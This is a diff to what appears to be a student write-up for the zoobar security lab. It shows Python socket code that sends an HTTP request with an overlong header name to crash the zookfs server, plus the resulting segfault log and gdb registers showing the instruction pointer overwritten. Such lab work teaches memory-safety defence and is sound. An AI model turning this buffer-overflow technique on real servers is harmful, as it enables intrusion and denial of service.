@@ -96,7 +96,7 @@ For the second vulnerability we chose to exploit was how the zoobar HTTP server 
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
         client.connect((host, port)) # Connect to user supplied port and IP address
 
-        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "B" + ": foo" + "\r\nConnection: Close\r\n\r\n"
+        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "C" + ": foo" + "\r\nConnection: Close\r\n\r\n"
         client.send(command) # Send the user command with a variable length name
         data = client.recv(1024) # Recieve Reply
         client.close() # Close the Connection
@@ -114,7 +114,27 @@ The memory corruption happens after we have sent little over 500 bytes:
 
 If we look at the status of dmesg, we can see the following:
 
-    [ 9611.046876] zookfs-exstack[3471]: segfault at 42424242 ip 42424242 sp bfffde00 error 14
+    vm-6858 kernel: [  232.463970] zookfs-exstack[976]: segfault at 43434343 ip 43434343 sp bfffde10 error 14
+
+    0x43434343 in ?? ()
+    (gdb) info reg
+    eax            0x804a147	134521159
+    ecx            0x401d58fc	1075665148
+    edx            0x1	1
+    ebx            0x43434343	1128481603
+    esp            0xbfffde10	0xbfffde10
+    ebp            0x43434343	0x43434343
+    esi            0x0	0
+    edi            0x0	0
+    eip            0x43434343	0x43434343
+    eflags         0x10282	[ SF IF RF ]
+    cs             0x73	115
+    ss             0x7b	123
+    ds             0x7b	123
+    es             0x7b	123
+    fs             0x0	0
+    gs             0x33	51
+
 
 ------
 
